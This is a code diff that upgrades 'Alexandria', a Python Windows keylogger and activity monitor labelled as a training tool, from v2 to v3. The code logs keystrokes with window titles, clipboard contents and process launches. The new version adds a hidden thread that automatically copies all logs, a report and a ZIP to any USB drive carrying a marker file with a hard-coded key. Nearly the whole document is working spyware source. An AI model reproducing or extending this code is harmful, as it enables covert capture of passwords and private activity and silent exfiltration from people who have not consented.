@@ -1,20 +1,11 @@
 """
-Alexandria v2 - Laboratory Activity Monitor
+Alexandria v3 - Laboratory Activity Monitor
 For authorized cybersecurity training only.
 
-Features:
-  - Keyboard logger (CHAR + EN + VK)
-  - Active window monitor
-  - Browser history extractor
-  - Clipboard monitor
-  - Process launch monitor
-  - Idle detection
-  - System info collector
-  - USB device events
-  - Log rotation
-  - SHA-256 integrity
-  - ZIP export
-  - HTML report generator
+New in v3:
+  - Auto-export when a specific USB is plugged in
+  - Marker file detection (ALEXANDRIA.md with specific content)
+  - USB plug/unplug event logging
 """
 import sys, os, time, shutil, sqlite3, tempfile, json, socket, platform
 import hashlib, zipfile, ctypes
@@ -41,11 +32,14 @@ DEFAULT_CONFIG = {
     "enable_zip_export": True,
     "enable_html_report": True,
     "enable_sha256": True,
+    "auto_export_enabled": True,
+    "auto_export_marker_file": "ALEXANDRIA.md",
+    "auto_export_marker_content": "ALEXANDRIA-AUTHORIZED-EXPORT-KEY-v3-2026",
+    "auto_export_check_interval": 5,
 }
 
 def load_config():
     cfg = dict(DEFAULT_CONFIG)
-    # ابتدا config کنار EXE، بعد در APPDATA
     for path in [CONFIG_FILE, os.path.join(os.environ.get("APPDATA", ""), "Alexandria", "config.json")]:
         try:
             if os.path.isfile(path):
@@ -72,7 +66,6 @@ def log_path(name):
 def safe_write(path, text):
     try:
         with _write_lock:
-            # Log rotation
             if os.path.exists(path) and os.path.getsize(path) > CFG["log_max_size_mb"] * 1024 * 1024:
                 rotated = path.replace(".txt", f"_{int(time.time())}.txt")
                 os.rename(path, rotated)
@@ -87,7 +80,7 @@ def ensure_single_instance():
         kernel32 = ctypes.windll.kernel32
         mutex_name = "Global\\Alexandria_Lab_Monitor_Mutex_2026"
         handle = kernel32.CreateMutexW(None, False, mutex_name)
-        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+        if kernel32.GetLastError() == 183:
             sys.exit(0)
         return handle
     except Exception:
@@ -107,7 +100,7 @@ def get_idle_seconds():
     except Exception:
         return 0
 
-# ---------- Export ----------
+# ---------- Drive helpers ----------
 def is_removable_drive(path):
     try:
         drive = os.path.splitdrive(os.path.abspath(path))[0] + "\\"
@@ -115,6 +108,34 @@ def is_removable_drive(path):
     except Exception:
         return False
 
+def list_removable_drives():
+    """لیست حرف درایوهای قابل جابجایی مثل ['E:\\', 'F:\\']"""
+    drives = []
+    try:
+        for part in psutil.disk_partitions(all=False):
+            try:
+                drive = part.device[:2] + "\\"
+                if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
+                    drives.append(drive)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return drives
+
+def check_marker(drive, filename, expected_content):
+    """بررسی وجود و محتوای فایل نشانه روی درایو"""
+    try:
+        marker_path = os.path.join(drive, filename)
+        if not os.path.isfile(marker_path):
+            return False
+        with open(marker_path, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read().strip()
+        return content == expected_content.strip()
+    except Exception:
+        return False
+
+# ---------- Export ----------
 def compute_sha256(path):
     h = hashlib.sha256()
     try:
@@ -126,13 +147,14 @@ def compute_sha256(path):
         return None
 
 def generate_html_report(log_dir, report_path):
-    """ساخت گزارش HTML خوانا"""
     stats = {
         "total_keystrokes": 0,
         "total_window_changes": 0,
         "total_browser_visits": 0,
         "total_clipboard": 0,
         "total_processes": 0,
+        "total_usb_events": 0,
+        "auto_exports": 0,
         "top_apps": {},
         "top_sites": {},
         "hourly_activity": {h: 0 for h in range(24)},
@@ -151,7 +173,6 @@ def generate_html_report(log_dir, report_path):
                         stats["total_keystrokes"] += 1
                     elif "activity_" in fname and "ACTIVE:" in line:
                         stats["total_window_changes"] += 1
-                        # استخراج نام پروسه
                         try:
                             proc = line.split("ACTIVE:")[1].split("|")[0].strip()
                             stats["top_apps"][proc] = stats["top_apps"].get(proc, 0) + 1
@@ -169,7 +190,10 @@ def generate_html_report(log_dir, report_path):
                         stats["total_clipboard"] += 1
                     elif "process_" in fname:
                         stats["total_processes"] += 1
-                    # استخراج ساعت
+                    elif "usb_" in fname:
+                        stats["total_usb_events"] += 1
+                        if "AUTO-EXPORT COMPLETED" in line:
+                            stats["auto_exports"] += 1
                     if line.startswith("["):
                         try:
                             ts = line[1:20]
@@ -187,7 +211,6 @@ def generate_html_report(log_dir, report_path):
 
     top_apps = sorted(stats["top_apps"].items(), key=lambda x: -x[1])[:10]
     top_sites = sorted(stats["top_sites"].items(), key=lambda x: -x[1])[:10]
-
     max_hour = max(stats["hourly_activity"].values()) or 1
 
     html = f"""<!DOCTYPE html>
@@ -224,6 +247,8 @@ def generate_html_report(log_dir, report_path):
 <div class="stat"><div class="num">{stats['total_browser_visits']:,}</div><div class="lbl">Browser Visits</div></div>
 <div class="stat"><div class="num">{stats['total_clipboard']:,}</div><div class="lbl">Clipboard Events</div></div>
 <div class="stat"><div class="num">{stats['total_processes']:,}</div><div class="lbl">Process Launches</div></div>
+<div class="stat"><div class="num">{stats['total_usb_events']:,}</div><div class="lbl">USB Events</div></div>
+<div class="stat"><div class="num">{stats['auto_exports']:,}</div><div class="lbl">Auto-Exports</div></div>
 </div>
 
 <div class="card">
@@ -248,7 +273,7 @@ def generate_html_report(log_dir, report_path):
 </div>
 
 <div class="footer">
-Generated by Alexandria v2 | For authorized laboratory use only
+Generated by Alexandria v3 | For authorized laboratory use only
 </div>
 </body>
 </html>"""
@@ -261,40 +286,42 @@ Generated by Alexandria v2 | For authorized laboratory use only
         return False
 
 
-def export_to_usb(target_dir):
+def export_to_usb(target_dir, trigger="manual"):
     target_dir = target_dir.strip().strip('"').rstrip('\\/')
     if not target_dir or not os.path.isdir(target_dir):
         print(f"[!] Invalid target directory: {target_dir}")
-        return
+        return False
     if not is_removable_drive(target_dir):
         print(f"[!] Target is NOT a removable USB drive: {target_dir}")
-        return
+        return False
 
     dest = os.path.join(target_dir, "logs_export")
     os.makedirs(dest, exist_ok=True)
 
     files = [f for f in os.listdir(LOG_DIR) if os.path.isfile(os.path.join(LOG_DIR, f))]
 
-    # کپی ساده
     for fname in files:
-        shutil.copy2(os.path.join(LOG_DIR, fname), os.path.join(dest, fname))
+        try:
+            shutil.copy2(os.path.join(LOG_DIR, fname), os.path.join(dest, fname))
+        except Exception:
+            pass
 
-    # گزارش HTML
     if CFG.get("enable_html_report", True):
         generate_html_report(LOG_DIR, os.path.join(dest, "report.html"))
 
-    # SHA-256 برای هر فایل
     if CFG.get("enable_sha256", True):
         hashes = {}
         for fname in files:
             h = compute_sha256(os.path.join(dest, fname))
             if h:
                 hashes[fname] = h
-        with open(os.path.join(dest, "_hashes.sha256"), "w", encoding="utf-8") as f:
-            for name, h in hashes.items():
-                f.write(f"{h}  {name}\n")
+        try:
+            with open(os.path.join(dest, "_hashes.sha256"), "w", encoding="utf-8") as f:
+                for name, h in hashes.items():
+                    f.write(f"{h}  {name}\n")
+        except Exception:
+            pass
 
-    # ZIP فشرده
     if CFG.get("enable_zip_export", True):
         zip_path = os.path.join(target_dir, "alexandria_export.zip")
         try:
@@ -305,18 +332,83 @@ def export_to_usb(target_dir):
         except Exception as e:
             print(f"[!] ZIP failed: {e}")
 
-    # Summary
-    with open(os.path.join(dest, "_summary.txt"), "w", encoding="utf-8") as f:
-        f.write("Alexandria v2 Export\n")
-        f.write(f"Export time: {datetime.now()}\n")
-        f.write(f"Source: {LOG_DIR}\n")
-        f.write(f"Files copied: {len(files)}\n")
-        f.write(f"HTML report: {'yes' if CFG.get('enable_html_report') else 'no'}\n")
-        f.write(f"SHA-256 manifest: {'yes' if CFG.get('enable_sha256') else 'no'}\n")
-        f.write(f"ZIP archive: {'yes' if CFG.get('enable_zip_export') else 'no'}\n")
+    try:
+        with open(os.path.join(dest, "_summary.txt"), "w", encoding="utf-8") as f:
+            f.write("Alexandria v3 Export\n")
+            f.write(f"Export time: {datetime.now()}\n")
+            f.write(f"Trigger: {trigger}\n")
+            f.write(f"Source: {LOG_DIR}\n")
+            f.write(f"Target: {target_dir}\n")
+            f.write(f"Files copied: {len(files)}\n")
+    except Exception:
+        pass
 
-    print(f"[+] {len(files)} log file(s) copied to {dest}")
-    print(f"[+] HTML report: {os.path.join(dest, 'report.html')}")
+    print(f"[+] {len(files)} log file(s) copied to {dest} (trigger={trigger})")
+    return True
+
+
+# ---------- Auto-Export Monitor ----------
+def auto_export_monitor():
+    """پایش خودکار فلش و export در صورت تطابق نشانه"""
+    if not CFG.get("auto_export_enabled", False):
+        return
+
+    marker_file = CFG.get("auto_export_marker_file", "ALEXANDRIA.md")
+    marker_content = CFG.get("auto_export_marker_content", "")
+    interval = CFG.get("auto_export_check_interval", 5)
+
+    if not marker_file:
+        return
+
+    already_exported = set()  # درایوهایی که در این اتصال export شدند
+    known_drives = set()      # برای تشخیص اتصال/قطع
+
+    # لاگ شروع
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    safe_write(log_path("usb"), f"[{ts}] AUTO-EXPORT MONITOR STARTED (marker={marker_file})")
+
+    while True:
+        try:
+            current_drives = set(list_removable_drives())
+
+            # تشخیص اتصال جدید
+            for drive in current_drives - known_drives:
+                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                safe_write(log_path("usb"), f"[{ts}] USB CONNECTED: {drive}")
+
+            # تشخیص قطع
+            for drive in known_drives - current_drives:
+                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                safe_write(log_path("usb"), f"[{ts}] USB DISCONNECTED: {drive}")
+
+            # بررسی نشانه در درایوهای جدید
+            for drive in current_drives:
+                if drive in already_exported:
+                    continue
+
+                if check_marker(drive, marker_file, marker_content):
+                    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    safe_write(log_path("usb"),
+                        f"[{ts}] MARKER MATCHED: {drive} — starting auto-export")
+
+                    ok = export_to_usb(drive, trigger="auto")
+
+                    ts2 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    status = "COMPLETED" if ok else "FAILED"
+                    safe_write(log_path("usb"),
+                        f"[{ts2}] AUTO-EXPORT {status}: {drive}")
+
+                    if ok:
+                        already_exported.add(drive)
+
+            # پاک کردن درایوهایی که دیگه وصل نیستند
+            already_exported &= current_drives
+            known_drives = current_drives
+
+        except Exception:
+            pass
+
+        time.sleep(interval)
 
 
 # ---------- VK mapping ----------
@@ -392,9 +484,8 @@ def update_current_window():
 
 def on_press(key):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    idle = get_idle_seconds() if CFG.get("enable_idle_detection") else 0
-    if CFG.get("enable_idle_detection") and idle > CFG["idle_threshold_seconds"]:
-        return  # کاربر بیکار بوده
+    if CFG.get("enable_idle_detection") and get_idle_seconds() > CFG["idle_threshold_seconds"]:
+        return
     prefix = f"[{ts}] [{current_window['process']}] [{current_window['title']}]"
     vk = get_vk(key)
     en = vk_to_english(vk)
@@ -428,7 +519,7 @@ def monitor_clipboard():
                 data = win32clipboard.GetClipboardData()
             finally:
                 win32clipboard.CloseClipboard()
-            if data and data != last and len(str(data)) > 0:
+            if data and data != last:
                 preview = str(data)[:500].replace("\r", " ").replace("\n", " ")
                 ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 safe_write(log_path("clipboard"),
@@ -441,9 +532,8 @@ def monitor_clipboard():
 # ---------- Process monitor ----------
 def monitor_processes():
     seen = set()
-    # اولیه: پروسه‌های فعلی را ذخیره کن
     try:
-        for p in psutil.process_iter(["pid", "name"]):
+        for p in psutil.process_iter(["pid"]):
             seen.add(p.info["pid"])
     except Exception:
         pass
@@ -459,7 +549,6 @@ def monitor_processes():
                     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     safe_write(log_path("process"),
                         f"[{ts}] LAUNCH: {name} | PID: {pid} | USER: {user} | EXE: {exe}")
-            # پاک‌سازی PIDهای مرده
             alive = set(p.pid for p in psutil.process_iter(["pid"]))
             seen &= alive
         except Exception:
@@ -509,29 +598,6 @@ def log_system_info():
     }
     safe_write(log_path("system"), json.dumps(info, ensure_ascii=False))
 
-# ---------- USB events ----------
-def monitor_usb_events():
-    """پایش دوره‌ای درایوهای قابل جابجایی"""
-    known = set()
-    while True:
-        try:
-            current = set()
-            for p in psutil.disk_partitions(all=False):
-                if "removable" in p.opts.lower() or p.fstype in ("FAT32", "exFAT"):
-                    current.add(p.device)
-            # اتصال جدید
-            for dev in current - known:
-                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                safe_write(log_path("usb"), f"[{ts}] USB CONNECTED: {dev}")
-            # قطع
-            for dev in known - current:
-                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                safe_write(log_path("usb"), f"[{ts}] USB DISCONNECTED: {dev}")
-            known = current
-        except Exception:
-            pass
-        time.sleep(10)
-
 # ---------- Daemon ----------
 def run_daemon():
     log_system_info()
@@ -557,15 +623,17 @@ def run_daemon():
         Thread(target=monitor_clipboard, daemon=True).start()
     if CFG.get("enable_process_monitor"):
         Thread(target=monitor_processes, daemon=True).start()
-    if CFG.get("enable_usb_events"):
-        Thread(target=monitor_usb_events, daemon=True).start()
+
+    # Auto-Export Monitor (جایگزین monitor_usb_events)
+    if CFG.get("auto_export_enabled"):
+        Thread(target=auto_export_monitor, daemon=True).start()
 
     listener.join()
 
 # ---------- Main ----------
 if __name__ == "__main__":
     if len(sys.argv) >= 3 and sys.argv[1] == "--export":
-        export_to_usb(sys.argv[2])
+        export_to_usb(sys.argv[2], trigger="manual-cli")
     else:
         _mutex = ensure_single_instance()
         run_daemon()
